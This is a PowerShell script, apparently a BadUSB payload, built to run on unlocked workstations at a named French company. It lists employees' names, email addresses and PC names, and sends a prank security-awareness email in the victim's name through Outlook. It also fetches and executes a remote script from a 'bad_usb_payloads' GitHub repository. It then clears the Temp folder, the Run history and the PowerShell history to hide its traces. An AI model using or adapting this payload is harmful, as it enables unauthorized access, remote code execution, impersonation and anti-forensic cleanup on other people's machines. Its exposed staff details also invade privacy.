Add-Type -AssemblyName System.Windows.Forms

# Liste des personnes à contacter
$people = @()

$people += [PSCustomObject]@{ Name = "Christophe"; Email = "support-si@garnier-durand.fr"; Computer = "STP011" }
$people += [PSCustomObject]@{ Name = "Bernardino"; Email = "logistique@garnier-durand.fr"; Computer = "PC-Logistique-GD" }
$people += [PSCustomObject]@{ Name = "Lilou"; Email = "rh@garnier-durand.fr"; Computer = "STF-27" }
$people += [PSCustomObject]@{ Name = "Murielle"; Email = "m.bonnin@garnier-durand.fr"; Computer = "PC-ACHATS" }
$people += [PSCustomObject]@{ Name = "Pascal"; Email = "p.trouve@garnier-durand.fr"; Computer = "STP008" }
$people += [PSCustomObject]@{ Name = "Otilia"; Email = "o.salmon@garnier-durand.fr"; Computer = "STF-29" }
$people += [PSCustomObject]@{ Name = "Coralie"; Email = "assistante.commercial@garnier-durand.fr"; Computer = "STF-28" }
$people += [PSCustomObject]@{ Name = "Magalie"; Email = "m.blot@garnier-durand.fr"; Computer = "STP004" }
$people += [PSCustomObject]@{ Name = "Adrien"; Email = "qualite@garnier-durand.fr"; Computer = "STP007" }

# Récupérer le nom du PC
$computerName = $env:COMPUTERNAME

# Récupérer la personne associée au PC et la retirer de la liste
$target = $people | Where-Object { $_.Computer -eq $computerName }

# Si la personne n'a pas été trouvée, fallback sur le script ScreenLockPolice
if ($null -eq $target) {
    Invoke-Expression (Invoke-WebRequest 'https://raw.githubusercontent.com/MagikarpLv13/bad_usb_payloads/master/ScreenLockPolice/script.ps1')
    exit
}

# Actualiser la liste des personnes
$people = $people | Where-Object { $_.Computer -ne $computerName }

# Liste des cadeaux
$present = @(
    "un pain au chocolat", 
    "un croissant", 
    "un croissant aux amandes",
    "un saucisson", 
    "un pain suisse", 
    "un pain aux raisins", 
    "un cookie", 
    "un muffin", 
    "une brioche aux pralines"
    )

# Sélectionner un cadeau aléatoire
$randomPresent = Get-Random -InputObject $present

# Sélectionner un nom aléatoire
$randomPerson = Get-Random -InputObject $people

# Obtenir l'heure actuelle au format HH:mm:ss
$currentDateTime = Get-Date
$hour = $currentDateTime.Hour
$minute = $currentDateTime.Minute
$second = $currentDateTime.Second

# Définir la variable seconde_text en fonction de la valeur de $second
if ($second -eq 0) {
    $seconde_text = ""
} elseif ($second -eq 1) {
    $seconde_text = "seconde"
} else {
    $seconde_text = "secondes"
}

# Créer une instance Outlook
$Outlook = New-Object -ComObject Outlook.Application

# Créer un nouvel email
$Mail = $Outlook.CreateItem(0)

# Définir les propriétés de l'email
$Mail.Subject = "Rappel : Verrouillez votre session"
$Mail.BodyFormat = 2
$Mail.HTMLBody = @"
<html>
<head>
    <meta charset="UTF-8">
</head>
<body>
<p>Chers collègues, laissez-moi vous conter une histoire..</p>

<p>Il n'était pas plus tard que <strong>$($hour)h$($minute) et .. $($second) $($seconde_text)</strong> environ, lorsqu'une personne bien intentionnée s'est introduite sur mon ordinateur.<br>
J'avais oublié de verrouiller ma session quand j'ai quitté mon poste. Cette personne aurait pu accéder à <strong>toutes mes données sensibles !</strong><br>
Mais heureusement, elle n'a rien fait de tout ça, au contraire, elle s'est empressée de verrouiller ma session avec le raccourci clavier <strong>Windows + L</strong></p>

<p>Et pour la remercier, moi, $($target.Name), m'engage à offrir <strong>$randomPresent</strong> à une personne aléatoire du bureau ! Cette fois-ci ce sera ... $($randomPerson.Name) 😊</p>

<p>Ce mail, ainsi que tous ses destinataires constituent une preuve pour l'intéressé(e).</p>

<p>Pour ne pas que cela m'arrive à nouveau, je suis sûr que je penserai à verrouiller ma session la prochaine fois !</p>

<p>Je vous souhaite à tous une merveilleuse journée.
<br>Cordialement,
<br>$($target.Name)</p>
</body>
</html>
"@

# Envoyer un mail à tous les destinataires
$Mail.To = $people.Email -join ";"

# Envoyer l'email
$Mail.Display()

# Supprime les traces du passage

# Supprime le conteu du dossier Temp
Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Supprime l'historique des commandes exécutées
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Supprime l'historique des commandes exécutées dans PowerShell
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Verrouiller la session utilisateur
# rundll32.exe user32.dll, LockWorkStation 